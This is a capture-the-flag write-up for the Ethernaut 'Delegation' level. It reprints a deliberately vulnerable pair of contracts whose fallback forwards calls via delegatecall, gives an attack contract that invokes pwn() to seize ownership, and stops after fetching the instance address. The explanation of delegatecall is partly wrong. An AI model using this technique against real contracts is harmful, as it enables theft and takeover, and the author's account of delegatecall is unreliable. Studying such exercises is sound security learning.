<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel6.svg">

## Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

Challenge's message.

> The goal of this level is for you to claim ownership of the instance you are given.

If we scrutinise contracts, there is only variable named owner in the **Delagate** contract and in the **Delagation** contract has owner and delegate variable. What is more , there is  a ```fallback()``` function which is exploitable. As long as we call fallback function with Delegate's function name, we can change some value. :) Let's do it!

## Subverting

In the fallback function there is calling some data from Delegate contract with ```delegatecall``` method. Shortly, **delegate** is a low level function similar to **call**. When contract **Delegation** executes delegatecall to contract **Delegate**, **Delegate**'s code is executedwith contract **Delegation**s storage, **_msg.data_**.

My attack contract.

```solidity
pragma solidity ^0.6.0;

import './Delegation.sol';

contract Attack{

    address public targetcontract;

    constructor(address _target)public{
        	targetcontract = _target;
    }

    function attack()public{
        targetcontract.call(abi.encodeWithSignature("pwn()"));
    }
}
```
For this part form of hacking, I should explain what I am doing. In first, I need get some information about contract such as contract address why will call it in attack function. Afterwards, I am calling fallback() from Delegation contract and it will call pwn() function from Delegate contract. In other saying, I am selecting pwn() function under favour of ```abi.enodeWithSignature```. The truth of the matter is that the delegatecall function returns a storage value from the called address, so when we call the pwn function, the contract will update us as the new owner, which will solve the question.

Learn contract address at first.

```shell
await instance
'0xf501D64dC0eff953cddCD8270f20f711A7aCF31E'
```
Deploy contract with contract address.
<img src="">
